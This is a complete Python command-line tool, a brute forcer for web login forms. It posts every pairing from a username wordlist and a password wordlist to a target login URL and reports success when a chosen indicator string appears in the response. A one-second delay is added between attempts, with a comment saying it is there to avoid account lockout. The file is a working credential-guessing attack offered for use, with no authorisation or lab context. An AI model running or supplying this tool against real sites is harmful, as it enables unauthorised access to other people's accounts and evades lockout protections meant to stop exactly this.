import requests
import argparse
import sys
from time import sleep

# Define the command-line arguments for the script
parser = argparse.ArgumentParser(description='Web Login Form Brute Forcer')
parser.add_argument('--target', required=True, help='Target URL of the login form')
parser.add_argument('--usernames', required=True, help='File containing list of usernames')
parser.add_argument('--passwords', required=True, help='File containing list of passwords')
parser.add_argument('--indicator', required=True, help='Success indicator text in response')
args = parser.parse_args()

# Attempt to log in with a single set of credentials
def attempt_login(session, target, username, password, success_indicator):
    try:
        response = session.post(target, data={"username": username, "password": password})
        return success_indicator in response.text
    except requests.exceptions.RequestException as e:
        print(f"Connection error: {e}")
        return False

# Main brute-forcing function
def brute_force_login(target, usernames_file, passwords_file, success_indicator):
    with requests.Session() as session:
        try:
            with open(usernames_file, 'r') as u_file:
                usernames = [line.strip() for line in u_file]
            with open(passwords_file, 'r') as p_file:
                passwords = [line.strip() for line in p_file]
                
            for username in usernames:
                for password in passwords:
                    sys.stdout.write(f"Attempting user:password -> {username}:{password}\r")
                    sys.stdout.flush()
                    if attempt_login(session, target, username, password, success_indicator):
                        print(f"\n[SUCCESS] Valid password '{password}' found for user '{username}'!")
                        return
                    sleep(1)  # Add delay to prevent account lockout
            print("\nBrute force attack completed with no success.")
        except FileNotFoundError as e:
            print(f"File error: {e}")
            sys.exit(1)
        except Exception as e:  # General exception for unexpected errors
            print(f"An unexpected error occurred: {e}")
            sys.exit(2)

# Run the brute force attack
if __name__ == '__main__':
    brute_force_login(args.target, args.usernames, args.passwords, args.indicator)
